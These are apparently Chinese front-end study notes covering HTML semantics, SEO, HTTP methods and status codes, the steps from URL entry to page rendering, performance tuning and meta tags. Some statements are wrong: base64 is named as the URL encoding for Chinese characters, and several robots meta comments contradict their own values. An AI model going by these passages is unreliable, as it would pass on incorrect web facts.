# html及web知识

## 前端需要注意哪些SEO

* 合理的`title`、`desciption`、`keywords`: 搜索引擎对着三项的权重逐个减小，`title`值强调重点即可，重要关键词出现不要超过2次，而且要靠前，不同页面`title`要有所不同；`description`把页面内容高度概括，长度合适，不可过分堆砌关键词，不同页面`description`有所不同；`keywords`列举出重要关键词即可

- 语义化的`HTML`代码，符合W3C规范：语义化代码让搜索引擎容易理解网页
- 重要内容`HTML`代码放在最前：搜索引擎抓取`HTML`顺序是从上到下，有的搜索引擎对抓取长度有限制，保证重要内容一定会被抓取
- 重要内容不要用`js`输出：爬虫不会执行js获取内容
- 少用`iframe`：搜索引擎不会抓取`iframe`中的内容
- 非装饰性图片必须加`alt`
- 提高网站速度：网站速度是搜索引擎排序的一个重要指标

## 标签相关

### `<img>`的`title`和`alt`有什么区别

- `title`通常当鼠标滑动到元素上的时候显示
- `alt`是`<img>`的特有属性，是图片内容的等价描述，用于图片无法加载时显示、读屏器阅读图片。可提图片高可访问性，除了纯装饰图片外都必须设置有意义的值，搜索引擎会重点分析。

### 行内元素有哪些？块级元素？空（void）元素？行内元素和块级元素的区别？

- 行内元素有：`a span img input button label textarea select strong b`等
  - `img`是行内元素但是却可以设置宽高，这是因为其是可替换元素
  - **可替换元素（replaced element）** ：内容不受 CSS 视觉格式化模型控制，CSS 渲染模型不考虑对此内容的渲染，且元素本身一般y拥有固有尺寸(宽度，高度，宽高比)，CSS 可以影响到可元素的位置，但是不会影响到元素自身的内容
  - `iframe`，`video`,`embed`,`img`
- 块级元素有：`div ul ol li dl dt dd table h* p header footer section`等
- 空元素：`<br> 换行 <hr> 分隔线 <img> <input> <link> <meta>`
- 行内元素特点：
  - 不可以设置宽高，行内元素设置width无效，height无效(可以设置line-height)，margin**上下**无效，padding**上下**无效（空有现象）
  - 不独占一行，宽度只与内容有关
  - 行内元素只能容纳文本或者其他行内元素
- 块级元素特点：
  - 可以设置宽高
  - 独占一行始终是与浏览器宽度一样，与内容无关
  - 可以容纳内联元素和其他块元素

## HTTP请求相关

### 7层OSI网络结构和4层TCP/IP

|        OSI 模型        |   TCP/IP   |             主要协议              |  单位  |
| :--------------------: | :--------: | :-------------------------------: | :----: |
|  应用层 (Application)  |   应用层   |   Telnet、FTP、**HTTP**、SNMP等   | 数据流 |
| 表示层 (Presentation)  |     -      | **CSS** GIF **HTML JSON **XML GIF | 数据流 |
|    会话层 (Session)    |     -      |      FTP SSH TLS HTTP(S) SQL      | 数据流 |
|   传输层 (Transport)   |   传输层   |            **TCP UDP**            | 数据段 |
|    网络层 (Network)    |   网际层   |        IP(IPV4、IPV6) ICMP        | 数据包 |
| 数据链路层 (Data Link) | 网络接口层 |      802.2、802.3ATM、HDLC、      |   帧   |
|   物理层 (Physical)    |     -      |         V.35、EIA/TIA-232         | 比特流 |

|   结构名   | 功能                                                         |              主要设备               |
| :--------: | :----------------------------------------------------------- | :---------------------------------: |
|   应用层   | 确定通信对象，提供访问网络服务的接口                         |                网关                 |
|   表示层   | 负责数据的编码、转化（界面与二进制数据转换，高级语言与机器语言的转换）数据压缩、解压，加密、解密。根据不同应用目的处理为不同的格式，表现出来就是我们看到的各种各样的文件扩展名。 |                网关                 |
|   会话层   | 负责建立、维护、控制会话单工(Simplex)、半双工(Half duplex)、全双工(Full duplex)三种通信模式的服务 |                网关                 |
|   传输层   | 负责分割、组合数据，实现端到端的逻辑连接三次握手(Three-way handshake)，面向连接(Connection-Oriented)或非面向连接(Connectionless-Oriented)的服务，流控(Flow control)等都发生在这一层。是第一个端到端，即主机到主机的层次。 |                网关                 |
|   网络层   | 负责管理网络地址，定位设备，决定路由                         |         路由器，网桥路由器          |
| 数据链路层 | 负责准备物理传输，CRC校验，错误通知，网络拓扑，流控等        |         交换机、网桥、网卡          |
|   物理层   | 就是实实在在的物理链路，负责将数据以比特流的方式发送、接收   | 集线器、中继器,电缆，发送器，接收器 |

### 几种请求方法用途

HTTP（HyperText Transfer Protocol，超文本传输协议）中定义的请求方法共八种：

* **`GET`**发送一个请求取得服务器上的某一资源，检索信息（查）
  * 能被浏览器缓存，被书签收藏
  * 请求参数放在URL中，以`?`分割URL和数据，参数之间用`&`分割，数据是英文字母或数字时原样发送；是空格时转换为`+`；是中文时转换为base64编码，长度有限制
  * 回退是无害的
* **`POST`**向URL指定的资源提交数据或附加新的数据，即创建或附加资源（增、改）
  * 很少能被缓存，不能被书签收藏
  * 参数放在请求体中message body，长度没有限制
  * 回退会再次提交请求
* **`PUT`**和`post`很像，也向服务器提交数据，不同在于`put`指定了资源在服务器上的位置，创建或替换资源（增、改）
  * 华为手机浏览器不支持PUT方法，因此有些公司会规定添加和修改都使用POST
  * 不可缓存
* **`DELETE`**删除服务器上的某资源（删）。
* `HEAD`只请求与`get`请求一致的页面的头部，检查一个大文件是否存在，检查文件是否有新版本。
* `OPTIONS`用于获取当前URL所支持的方法，成功会有一个`Allow`的头包含支持的方法；也可以利用其向 web 服务器发送 `*` 的请求来测试服务器的功能性
* `TRACE`回显服务器收到的请求，主要用于测试或诊断
* `CONNECT` HTTP/1.1协议中能够将连接改为管道方式的代理服务器

*补充*：

* HTTP协议中的概念：“安全”：读操作，“幂等”：多次执行与执行一次效果相同

* GET请求能够被保存在浏览器的浏览历史里面
  不准确！只有是在浏览器地址栏内输入的URL地址才可以在浏览器历史中查看。

* GET参数是带在URL后面，传统IE中URL的最大可用长度为2048字符，其他浏览器对URL长度限制实现上有所不同，POST请求无长度限制
  不准确！上方已经写出了结论：除了在地址栏中输入URL发送GET请求有明显的限制，而直接通过代码发送请求，Get(80K左右)和Post(100K)发送的数据大小相差不多。

### 状态码

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020080809295039.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3phcHpxYw==,size_16,color_FFFFFF,t_70#pic_center)

* `1xx`：临时响应，表示服务器正在处理请求的一个状态；
  * `100 Continue`继续，一般在发送`post`请求时，已发送`http header`之后服务端将返回此信息，表示确认，之后再发送具体参数信息
  * `101 switching protocol`服务器响应客户端升级协议的请求
  * `103 early hints`服务器还在准备，允许客户端预加载一些数据
* `2xx`：成功状态码，表示请求已完成，服务器向浏览器提供了预期的响应；
  * `200 Ok`请求成功，正常返回信息
  * `201 Create`请求成功并在服务器创建了新的资源
  * `202 Accepted`服务器已接受请求，但尚未处理
  * `204 No Content`请求执行成功，但没有数据，浏览器不需要刷新页面
  * `205 Reset Content`服务器处理成功，浏览器应重置文档视图。可通过此返回码清除浏览器的表单域
  * `206 Partial Content`部分内容
* `3xx`：重定向，表示你的请求被重定向到了其他地方，服务器收到了请求但是有某种重定向；
  * `300 Multiple Choices` 多种选择，求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择
  * `301 Moved Permanently` 永久移动，请求的资源已被永久的移动到新 URI，返回信息会 包括新的 URI，浏览器会自动定向到新 URI。今后任何新的请求都应使用新的 URI 代替
  * `302 Found`临时重定向。但资源只是临时被移动。客户端应继续使用原有 URI
  * `303 See Other`临时重定向，且总是用`get`请求新的URL
  * `304 Not Modified`未修改。所请求的资源未修改，服务器返回此状态码时，不会返回 任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返 回在指定日期之后修改的资源
  * `305 Use Proxy`使用代理。所请求的资源必须通过代理访问
* `4xx`：客服端请求错误，表示客服端发生错误导致服务器无法处理请求；
  * `400 Bad Request` 客户端请求的语法错误，服务器无法理解
  * `401 Unauthorized`请求要求用户的身份认证
  * `403 Forbidden`禁止访问，用户认证后，但权限不足，无法对该资源进行操作
  * `404 Not Found` 找不到与url相匹配的资源。通过此代码，网站 设计人员可设置"您所请求的资源无法找到"的个性页面。
  * `405 Method Not Allowed`客户端请求中的方法被禁止
* `5xx`：服务端错误，客服端发出有效请求，但是服务器未做出正确处理请求
  * `500 Internal Server Error` 最常见的服务器端错误
  * `503 Service Unavaliable` 服务器端暂时无法处理请求（可能过载或维护）
  * `504 Gateway Time-out` 充当网关或代理的服务器，未及时从远端服务器获取请求
  * `505 HTTP Version not supported` 服务器不支持请求的 HTTP 协议的版本，无法完成处理

## 从浏览器地址栏输入url到显示页面的步骤

### 浏览器工作流程
* 在浏览器地址栏输入url
* 浏览器查看**缓存**：
  * 没有缓存，发起新请求
  * 已经缓存，检验是否新鲜，新鲜则直接提供给客户端，否则与服务器进行验证。检验常用两个HTTP头进行控制`Expires`和`Cache-Control`:
    * HTTP1.0 提供了`Expires`其值为一个绝对时间表示缓存新鲜日期
    * HTTP1.1 新增`Cache-Control: max-age=`其值为以秒为单位的最大新鲜时间
* 浏览器**解析URL**获取协议、主机、端口(默认80)、path，DNS解析**获取主机IP**地址：
  * DNS的ip也是有缓存的：浏览器缓存 -> 本机缓存 -> hosts文件 -> 路由器缓存 -> ISP DNS缓存 -> DNS递归查询（可能存在负载均衡导致每次IP不一样）
* **等待TCP队列**：chrome 有个机制，同一域名下同时最多只能建立6个TCP连接，如果同时有10个请求发生，其中4个就会进入等待队列，直至进行中的请求完成，如果小于6个，则直接进入TCP 连接。
* 打开一个socket与目标IP地址，端口**建立TCP连接**，三次握手：
  * 客户端发送一个TCP的`SYN=1, Seq=X`的包至服务器端口
  * 服务端发回`SYN=1, ACK=X+1, Seq=Y`的相应包
  * 客户端发送`ACK=Y+1, Seq=Z`
  * ![image-20211108162200854](https://imagehost-1311720054.cos.ap-nanjing.myqcloud.com/blog/%E7%9D%80%E6%89%8B%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/image-20211108162200854.png)
* TCP连接建立后，**发送HTTP请求**，连接建立成功之后，浏览器就可以与服务器之间通讯了。浏览器会向服务器发送请求信息，包括请求方法、请求 URL、http 版本协议。
* 服务器接收到请求进行解析，如果请求头包含**缓存验证信息**，如果新鲜返回304等状态码，或者是进行其它操作，最后将**响应报文通过TCP连接发送回浏览器**
* 浏览器接收HTTP响应，根据情况**关闭TCP或保留重用**，关闭的四次握手：
  * 主动方发送`Fin=1, Ack=Z, Seq=X`报文
  * 被动方发送`Ack=X+1, Seq=Z`
  * 被动方发送`Fin=1, Ack=X, Seq=Y`
  * 主动方发送`Ack=Y, Seq=X`
* 如果资源可缓存进行缓存
* 对响应进行**解码**（如gzip压缩）
### 浏览器渲染过程

解析html为DOM树 > 渲染树结构 > 布局渲染 > 绘制渲染树。

具体解析过程为：

开始解析 html 内容，将标签转化为 DOM 节点，然后解析它外部的css文件以及 style 中的样式信息。css 样式信息和 html 标签来构建渲染树。渲染树是由一些包含颜色大小等盒子组成的，按照从上到下，从左到右的方式显示，渲染树构建好之后，执行布局过程，将每个节点确定在屏幕上的确切坐标，最后使用 UI 后端层绘制每个节点。

![image-20211113145750091](https://imagehost-1311720054.cos.ap-nanjing.myqcloud.com/blog/%E7%9D%80%E6%89%8B%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/image-20211113145750091.png)

必看：[浏览器是如何解析html的？](https://juejin.cn/post/6844903745730396174#heading-1)

<span style="color: red;">必看：https://www.cnblogs.com/gg-qq/p/11327972.html</span>

* 、**解析HTML文档，构件DOM树，下载资源，构造CSSOM树，执行js脚本**，这些操作没有严格的先后顺序，以下分别解释：
* 构建**DOM树**：[如何构建DOM树](https://juejin.cn/post/6991097279604064292)
  * `Tokenizing`：根据HTML规范将字符流解析为标记
  * `Lexing`：词法分析将标记转换为对象并定义属性和规则
  * `DOM constroction`：根据HTML标记关系将对象组成DOM树
* 构建**CSS规则树**：
  * `Tokenizing`：字符流转换为标记流
  * `Node`：根据标记创建节点
  * `CSSOM`：节点创建CSSOM树
* 根据DOM树和CSSOM树构建**渲染树**：
  * 从DOM树的根节点遍历所有**可见节点**
  * 对每一个可见节点，找到恰当的CSSOM规则并应用
  * 发布可见节点的内容和计算样式
* **js解析**如下：
  * 参看必看

**显示页面**（HTML解析过程中会逐步显示页面）



#### load事件的缺点

```js
//你的代码
window.onload=fun1

//插件代码
window.onload=fun2
```

很明显，fun1被替换成fun2；所以就会出现，你的代码失效了！
现在很多插件都是要等到文档加载完才执行的，所以很多插件自己内部都会这有类似window.onload的注册方法，那么大家都用window.onload来注册函数那么就会出现部分代码失效问题！

而jquery的ready方法不会出现这个问题，因为它是个函数，函数有个参数是回调函数，每执行一次就会注册一个回调，你的代码写在回调里，这样就不会出现代码失效了，即使大家都用ready这个方法。

#### window.onload的替代方案--DOM状态检测

```js
var alreadyrunflag=0 //flag to indicate whether target function has already been run
 
if (document.addEventListener)
  document.addEventListener("DOMContentLoaded", function(){
      alreadyrunflag=1; 
      walkmydog()
  }, false)
else if (document.all && !window.opera){
  document.write('<script type="text/javascript" id="contentloadtag" defer="defer" src="javascript:void(0)"><\/script>')
  var contentloadtag=document.getElementById("contentloadtag")
  contentloadtag.onreadystatechange=function(){
    if (this.readyState=="complete"){
      alreadyrunflag=1;
      walkmydog()
    }
  }
}
 
window.οnlοad=function(){
  setTimeout("if (!alreadyrunflag) walkmydog()", 0);
}
```

#### 哪些异步加载js的方法

1) async  HTML5的属性,让JavaScript代码进行异步加载

```html
<script type="text/javascript" src="05.js" async="async"></script>
```
2) defer 老版本IE专用

```html
<script type="text/javascript" defer="defer"></script>
```
3) 动态的创建script的标签(可以解决兼容h5以及低版本ie的问题)

```html
<script type="text/javascript">
    function asyncLoaded(url,callback){
        var script = document.createElement("script");
        //  script.src = url;   假如说网速非常好，直接执行完成了，后面就监听不到状态的改变了
        if(script.readyState){
            script.onreadystatechange = function(){
                if(script.readyState == "complete" || script.readyState =="loaded"){
                    //                            执行某个函数
                    callback()
                }
            }
        }else{
            script.onload = function(){
                //                        执行某个函数
                callback()
            }
        }
        script.src = url;    //异步的过程
        document.head.appendChild(script)    
    }
    asyncLoaded("05.js",function(){
        fn()　　　　　　　　　　//05.js中的函数
    })
</script>
```

## 如何进行网站性能优化

### `content`方面：

* 减少http请求：合并文件、css精灵图、内联图片base64
* 减少DNS查询：DNS查询完成之前浏览器不能从这个主机下载任何任何文件。*方法*：DNS缓存、将资源分布到恰当数量的主机名，平衡并行下载和DNS查询。
  * 当我们使用电脑访问某个网址的时候,需要DNS服务器解析，并且把这个网址的ip临时储存起来，这样你下次访问这个网址的时候就可以直接解析，提高了访问速度，这就是DNS缓存，并且它会为缓存设定一个失效时间 (例如N小时)。
* 避免使用`table`，其内容要完全下载后才能显示

### `Server`方面：

* 使用`CDN`：内容分发网络（Content Delivery Network，简称CDN）是建立并覆盖在承载网之上，由分布在不同区域的边缘节点服务器群组成的分布式网络。CDN应用广泛，支持多种行业、多种场景内容加速，例如：图片小文件、大文件下载、视音频点播、直播流媒体、全站加速、安全加速。
* 配置`ETag`：Etag是 Entity tag的缩写，可以理解为“被请求变量的实体值”，Etag是服务端的一个资源的标识，在 **HTTP 响应头**中将其传送到客户端。浏览器**第一次**请求一个资源的时候，服务端给予返回，并且返回了ETag: "50b1c1d4f775c61:df3" 这样的字样给浏览器，当浏览器**再次**请求这个资源的时候，浏览器会将If-None-Match: W/"50b1c1d4f775c61:df3" 传输给服务端，服务端拿到该ETAG，对比资源是否发生变化，如果资源未发生改变，则返回`304`HTTP状态码，不返回具体的资源。
* 对组件使用`Gzip`压缩：前端如glup、webpack都是自带压缩的，gzip能在此基础上再进行50%的压缩，响应头会包含`Content-Encoding: gzip`
* 添加`Expires`：Expires：Thu，15 Apr  2010  20：00：00  GMT;  告诉浏览器缓存有效性持续到2010年4月15日为止，在这个时间之内相同的请求使用缓存，这个时间之外使用http请求。

### `Cookie`方面：

* 减小`cookie`大小：如果对某个域(Domain)保存了Cookie，那么针对这个域的所有请求，都会发送这些所有的Cookie（哪怕当前请求根本用不着，例如针对图片的请求），大量地、重复地发送Cookie毫无疑问会增加网络的流量，并因此而降低请求被执行的性能。

### `css`方面：

* 将样式表放到页面顶部
* 少用用css表达式，也称动态属性  `left: expression(document.body.offsetWidth - 110 + "px")`
* 使用`<link>`不适用`@import`
  * `<link>`是xhtml语法无兼容问题，在页面被加载时同时加载；`@import`只在IE5以上支持，其引用的css要等到页面加载完再加载；前者的权重更高

### `javascript`方面：

* 将脚本放到页面底部
* 将js和css从外部引入
* 压缩js和css
* 减少DOM访问
* 用变量保存ajax请求结果，避免频繁访问
* 用`innerHTML`代替DOM操作，较少DOM操作
* 设置样式时尽量通过类，而不是操作`style`
* 少用全局变量
* 模块延迟加载`defer`或异步加载`async`

### 图片方面：

* 优化图片：根据实际颜色需要选择色深、压缩
  * 色深即色彩深度，色彩深度是计算机图形学领域表示在位图或者视频帧缓冲区中储存1像素的颜色所用的位数，它也称为位/像素（bpp）。色彩深度越高，可用的颜色就越多
* 优化css精灵图
* 不要再html中拉伸图片
* 图片服务器，图床
* 图片预加载
* 视频可以先用图片代替，需要时在改为`video`

### 前端性能评级工具

* PageSpeed
* YSlow

### 渲染优化

* 不使用`iframe`：原因参考 ：   9`iframe`的缺点
* 禁止使用`gif`图片实现`loading`效果（降低CPU消耗）
* 尽量使用CSS3动画替代js动画
* 小图标base64，但不建议大图使用比较耗费cpu
  * 减少http请求
  * 避免文件跨域，尤其是小程序
  * 修改即使生效
* 页面头部中的`<style>`和`<script>`会阻塞页面，因为`Renderer`进程中js线程和GUI渲染线程是互斥的
  * https://www.cnblogs.com/yiyi17/p/8645830.html

[浏览器缓存看这一篇就够了](https://zhuanlan.zhihu.com/p/60950750)

[前端性能优化二--浏览器缓存](https://www.cnblogs.com/web-learn/p/15208864.html)

[前端性能优化四--网页加载更快的N种方式](https://www.cnblogs.com/web-learn/p/15217897.html)

## 语义化的理解

* 用正确的标签做正确的事
* `HTML`语义化能让页面结构化，便于浏览器、搜索引擎解析
* 在没有css情况下也是以一种文档格式显示，容易阅读
* 搜索引擎的爬虫依赖于标记来确定上下文和各个关键字的权重，利于SEO
* 易于理解和维护

## 介绍以下对于浏览器内核的理解

主要分为两部分：

* 渲染引擎`layout engineer || Rendering Engineer`：负责取得网页内容（html、xml、图像等）、整理讯息，计算页面的显示方式，输出至显示器。浏览器的内核不同对于网页的语法解释会有所不同，渲染效果也不同
* `JS`引擎：解析和执行js来实现网页动态效果

### 常见的浏览器内核有哪些？

主流浏览器：1、IE浏览器（Internet explorer）2、火狐浏览器（Firefox）3、谷歌浏览器（Chrome）4、苹果浏览器（Safari）5、欧朋浏览器（Opera）

四大主流内核：

* **Trident**: IE
* **Gecko**: Firefox
* **Webkit** : Safari和Chrome旧版
* **Blink**： Chrome和Opera

https://www.cnblogs.com/moon-lee/p/12359183.html

## 离线存储技术

HTML5提出了两大离线存储技术：`localstorage`与`Application Cache`，两者各有应用场景；传统还有离线存储技术为`Cookie`。

经过实践我们认为`localstorage`应该存储一些非关键性ajax数据，做锦上添花的事情；

`Application Cache`用于存储静态资源，仍然是干锦上添花的事情；web应用可进行缓存，并在没有网络的情况下使用，通过创建`cache manifest`文件，可以轻松的创建离线应用

Application Cache带来的三个优势是：

① 离线浏览

② 提升页面载入速度

③ 降低服务器压力

而且主要浏览器皆以支持Application Cache，就算不支持也不会对程序造成什么影响

```
<html  manifest="demo.appcache">
```

### 浏览器如何对离线资源进行管理和加载的？

* 在线：浏览器发现html头部有`manifest`属性，它会请求该文件，如果是第一次访问，就会根据其内容下载资源进行离线存储；如果访问过，则会比较新旧`manifest`，更新离线资源
* 离线：浏览器直接使用离线存储的资源

## iframe有哪些缺点

* iframe会阻塞主页面的onLoad事件
* 搜索引擎不能读取不利于SEO
* iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面并行加载
* 如果要使用iframe，最好通过js动态给iframe添加src属性，避免上述问题

## HTML全局属性（Global attribute）

* `class`:为元素设置类表示
* `data-*`：自定义属性
* `draggable`：设置元素是否可拖拽
* `id`：唯一
* `lang`：元素内容的语言
* `style`：行内样式
* `title`：元素相关建议信息

## Canvas和SVG的区别

* `Canvas`：通过`js`绘制的2D图像，逐像素渲染，一旦绘制完成就是一张图
  * 依赖分辨率
  * 不支持事件处理
  * 弱的文本渲染能力
  * 能够以`png`或`jpg`格式保存结果图像
  * 最适合图像密集型游戏，其中许多对象会频繁重绘
* `SVG`：是用`XML`描述的2D图形语言，其中的`DOM`是可以被`js`操控的，对象属性变化浏览器会自动重绘
  * 不依赖分辨率
  * 支持事件处理
  * 最适合带有大型渲染区域的应用程序（谷歌地图等）
  * 复杂度高渲染速度慢（任何频繁操作DOM的都不快）
  * 不适合游戏应用

## 如何在页面实现一个圆形可点击区域？

* `border-radius`
* `svg`
* 纯`js`时，获取鼠标点击坐标，计算是否在圆上

## 网页验证码是干什么的

* 区分操作者是人还是计算机的公共全自动应用程序。可以防止恶意破解密码、刷票、论坛灌水
* 有效防止黑客对某一个特定注册用户用特定程序暴力破解方式不断的登陆尝试

## meta和viewport 
> `viewport`
```js
<meta name="viewport" content="width=device-witdh, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
```
* `width`：设置`viewport`宽度，为一个正整数或字符串`device-witdh`表示设备宽度
* `height`：一般设置宽度后高度会自动解析，不用设置
* `initial-scale`：默认缩放比例，为一个数字可以带小数
* `minimum-scale`：允许用户最小缩放比例
* `maximum-scale`：允许用户最大缩放比例
* `user-scalable`：是否允许手动缩放

### 延伸问题

怎么处理移动端1px被渲染成2px的问题？

* 局部处理：
  * `meta`标签中的`viewport`属性里的`initial-scale`设置为`1.0`
  * `rem`按照设计稿标准走，外加利用`transform`的`scale(0.5)`缩小一倍即可
* 全局处理：
  * `meta`标签中的`viewport`属性里的`initial-scale`设置为`0.5`
  * `rem`按照设计稿标准走即可

### 其它meta
``` html
<!DOCTYPE html>   H5声明
<head lang="en" />  语言
<meta charset='utf-8' />  声明文档字符编码
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1"/> 优先使用IE最新版和chrome
<meta http-equiv=”pragma” content=”no-cache”> <!--设定禁止浏览器从本地机的缓存中调阅页面内容，设定后一旦离开网页就无法从Cache中再调出-->
<meta http-equiv=”cache-control” content=”no-cache”> <!--设置页面不缓存,清除缓存-->
<meta http-equiv=”expires” content=”0″>  <!--设定网页的到期时间 -->
<meta name="desciption" content="不超过150个字符"/>  页面描述
<meta name="keywords" content="xx xx"/>  页面关键词
<meta name="author" content="name, emial@gmail.com"/>   网页作者
<meta name='robots' content="index, follow"/>  告诉搜索引擎机器人哪些页面需要索引抓取
```
* `content`的内容：
  * `all`文件将被检索，且页面上的链接可以被跟踪
  * `none`文件：文件将不被检索，且页面上的链接不可以被跟踪；(和 “noindex, no follow”起相同作用)
  * index：文件将被检索；（让robot/spider登录）
  * follow：页面上的链接可以被查询；
  * noindex：文件将不被检索，但页面上的链接可以被查询；(不让robot/spider登录)
  * nofollow：文件可以被检索，页面上的链接不可以被查询。(不让robot/spider顺着此页的连接往下抓取)

* 产生如下写法：
```html
  <meta name=”robots” content=”index, follow” /> <!--表示此页面允许索引并跟踪此页面上的链接-->
  <meta name=”robots” content=”noindex, nofollow” /> <!--此页面允许索引并跟踪此页面上的链接--> 
  <meta name=”robots” content=”index, nofollow” /> <!--此页面允许索引并跟踪此页面上的链接-->
  <meta name=”robots” content=”noindex, follow” /> <!--允许索引并跟踪此页面上的链接-->
<meta name=”apple-mobile-web-app-title” content=”标题”/> iOS 设备 begin
<meta name=”apple-mobile-web-app-capable” content=”yes”/>  添加到主屏后的标题（iOS 6 新增）是否启用 WebApp 全屏模式，删除苹果默认的工具栏和菜单栏
<meta name=”apple-itunes-app” content=”app-id=myAppStoreID, affiliate-data=myAffiliateData, app-argument=myURL”/> 添加智能 App 广告条 Smart App Banner（iOS 6+ Safari）
<meta name=”apple-mobile-web-app-status-bar-style” content=”black”/> 设置苹果工具栏颜色
<meta name=”format-detection” content=”telphone=no, email=no”/> 格式检测，用来检测html里的一些格式
<meta name=”renderer” content=”webkit”>   启用360浏览器的极速模式(webkit)
<meta http-equiv=”X-UA-Compatible” content=”IE=edge”/> 避免IE使用兼容模式
<meta http-equiv=”Cache-Control” content=”no-siteapp” />  不让百度转码

<meta name=”HandheldFriendly” content=”true”>     <!--针对手持设备优化，主要是针对一些老的不识别viewport的浏览器，比如黑莓-->
<meta name=”MobileOptimized” content=”320″>   <!--微软的老式浏览器-->
<meta name=”screen-orientation” content=”portrait”>   <!--uc强制竖屏-->
<meta name=”x5-orientation” content=”portrait”>    <!--QQ强制竖屏-->
<meta name=”full-screen” content=”yes”>              <!--UC强制全屏-->
<meta name=”x5-fullscreen” content=”true”>       <!--QQ强制全屏-->
<meta name=”browsermode” content=”application”>   <!--UC应用模式-->
<meta name=”x5-page-mode” content=”app”>   <!-- QQ应用模式-->
<meta name=”msapplication-tap-highlight” content=”no”>    <!--windows phone 点击无高亮-->
```
## 为什么利用多个域名来存储网站资源会更有效？

* `CDN`缓存更方便
* 突破浏览器并发限制，浏览器一次能发送的http请求是有限的
* 节约`cookie`带宽
* 节约主域名的连接数，优化页面响应速度
* 防止不必要的安全问题

## `src`和`href`的区别

* `src`是source的缩写，指向外部资源
  * 在请求资源时会将指向的资源下载并嵌入到当前文档中当前标签的位置，例如`js`脚本、`img`和`iframe`
  * `<script src='demo.js'></script>`当浏览器解析到该标签，会暂停其它资源的下载和处理，直到该资源加载、编译、执行完毕，图片和框架等元素也如此。这也是为什么js脚本放在底部而不是头部
* `href`是Hypertext Reference的缩写，指向网络资源所在位置
  * 建立和当前元素（锚点）或当前文档（链接）之间的链接
  * `<link href="common.css" rel="stylesheet"/>`那么浏览器会识别该文档为`css`文件，就会**并行**下载资源并且不会停止对当前文档的处理。这也是为什么建议使用`link`方式来加载`css`，而不是使用`@import`方式

## 知道的网页制作会用到的图片格式有哪些？

* `png-8`、`png-24`、`jpeg`、`gif`、`svg`
  * 但是上面的那些都不是面试官想要的最后答案。面试官希望听到是`Webp`,`Apng`。（是否有关注新技术，新鲜事物）
* `Webp`：`WebP`格式，谷歌开发的一种旨在加快图片加载速度的图片格式。图片压缩体积大约只有`JPEG`的`2/3`，并能节省大量的服务器带宽资源和数据空间。`Facebook Ebay`等知名网站已经开始测试并使用`WebP`格式。
  * 在质量相同的情况下，WebP格式图像的体积要比JPEG格式图像小`40%`。
* `Apng`：全称是`“Animated Portable Network Graphics”`, 是PNG的位图动画扩展，可以实现png格式的动态图片效果。04年诞生，但一直得不到各大浏览器厂商的支持，直到日前得到 `iOS safari 8`的支持，有望代替`GIF`成为下一代动态图标准

![img](https://pic3.zhimg.com/80/9bfba760f53916e6a8a8c2458e0b1c36_720w.jpg?source=1940ef5c)

## 一次请求会产生哪些缓存

`dns`缓存，`cdn`缓存，浏览器缓存，服务器缓存

## 一个页面上有大量的图片（大型电商网站），加载很慢，你有哪些方法优化这些图片的加载，给用户更好的体验。

* 图片懒加载：在页面上的未可视区域可以添加一个滚动事件，判断图片位置与浏览器顶端的距离与页面的距离，如果前者小于后者，优先加载。
* 图片预加载：如果为幻灯片或相册，预先加载当前展示图片的前一张和后一张
* 使用`CSS sprite`、`SVG sprite`、`Iconfont`、`Base64`
* 如果图片过大，可以先加载一张经过特别压缩的图片缩略图，提高用户体验
* 如果图片展示区域小于图片真实大小，则应在服务端先对图片进行合理压缩，使其与展示区域一致

 * 图床 + CDN

## web开发中会话跟踪的方法有哪些

- `cookie`：cookie由服务器生成,发送给浏览器,浏览器把cookie以键值对形式保存到某个目录下的文本文件内,下一次请求同一网站时会把该cookie发送给服务器.

  - 弊端：
    - 每个特定域名最多生成cookie数量有限制
    - 没有加密，如果被人拦截会获取到所有信息

- `session`：服务器使用session把用户的信息临时保存在了服务器上,用户离开网站后session会被销毁.这种用户信息存储方式相对cookie来说更安全,可是session有一个缺陷: 如果服务器(集群)做了负载均衡,那么下一个操作请求被分配到了另一台服务器的时候session会丢失

  - 负载均衡：通常用于将工作负载分布到多个服务器来提高网站、应用、数据库或其他服务的性能和可靠性。

- `token`: token类似于cookie,但是token是由服务器加了密的,是要进行身份验证的,存的信息还比cookie多，是一种思想，而不是具体的功能。

  - 用户登录校验，校验成功后就返回Token给客户端；客户端收到数据后保存在客户端；客户端每次请求携带Token到服务器端；服务器端采用filter过滤器校验token,校验成功则返回请求数据,校验失败则返回错误码
  - 为什么使用token？
    - seesion：每次认证用户发起请求时,服务器需要去创建一个记录来存储信息.当越来越多的用户发请求时,内存的开销也会不断增加,服务器的压力越来越大,一直到服务器的极限.
    - CORS(跨域资源共享)：当我们需要让数据跨多台移动设备上使用时,跨域资源的共享会是一个让人头疼的问题.在使用Ajax抓取另一个域的资源,就可以会出现禁止请求的情况.
    - CSRF(跨站请求伪造)：用户在访问银行网站时,他们很容易受到跨站请求伪造的攻击,并且能够被利用其访问其他的网站.

- `url`重写

  - 当前浏览器把cookie禁用之后,浏览器在发请求的时候,就不会把cookie带到服务器端了(其中最重要的也包括JSESSIONID),因为禁用cookie之后浏览器拒绝一切站点向浏览器写入cookie的(注意再禁用之前是否已经有一些已经存在的cookie了),这样的话,多个请求就不能在服务器端拿到同一个session对象了(因为发送请求的时候没有把JSESSIONID的值传给服务器)。

        把JSESSIONID从客户端传给服务器,有俩种方式:
        1.JSESSIONID保存在cookie文件中,浏览器发送请求的时候把这个cookie文件中的数据带给服务器(cookie).
        2.通过传参的方式,把JSESSIONID的值通过要访问的URL传给服务器.(URL重写)

- 隐藏表单：在所有页面中,利用js 将用户ID设置在隐藏表单中,每次请求服务器的时候,将用户id上传,如果有一个表单没有上传,那么服务器就找不到该用户了

- `ip`地址

## 报文request和response的结构

### request报文结构

```text
（1）请求行：请求方法 请求url 协议版本 CRLF(换行符)
GET /Protocols/rfc2616/rfc2616-sec5.html HTTP/1.1
（2）请求头：包含若干行内容，每行以CRLF结束
Host: www.w3.org
Connection: keep-alive
Cache-Control: max-age=0
